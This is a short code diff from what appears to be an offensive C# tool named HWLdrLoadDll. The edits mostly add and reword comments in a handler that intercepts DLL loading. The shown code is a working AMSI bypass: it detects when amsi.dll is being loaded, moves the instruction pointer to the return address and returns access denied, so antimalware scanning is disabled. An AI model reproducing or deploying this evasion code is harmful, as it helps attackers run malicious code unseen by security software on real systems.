@@ -41,18 +41,24 @@ namespace HWLdrLoadDll
             {
                 try
                 {
+                    //get dll being loaded name
                     var dllName = Marshal
                       .PtrToStructure<Native.UnicodeString>((IntPtr)context.R8)
                       .ToString();
+
+                    //check if amsi.dll is being loaded
                     if (dllName
                         .IndexOf("amsi.dll", StringComparison.OrdinalIgnoreCase) >= 0)
                     {
-                        //read reutrn address from stack pointer
+                        //read reutrn address from stack pointer register
                         ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)context.Rsp);
-                        //set address in Instruction pointer
+
+                        //set address in the instruction pointer register
                         context.Rip = returnAddress;
-                        //Manully poping the return address from stack
+
+                        //Pop the return address from stack
                         context.Rsp += 8;
+
                         //Return NTStatus Access Denied
                         context.Rax = Native.STATUS_ACCESS_DENIED;
                     }
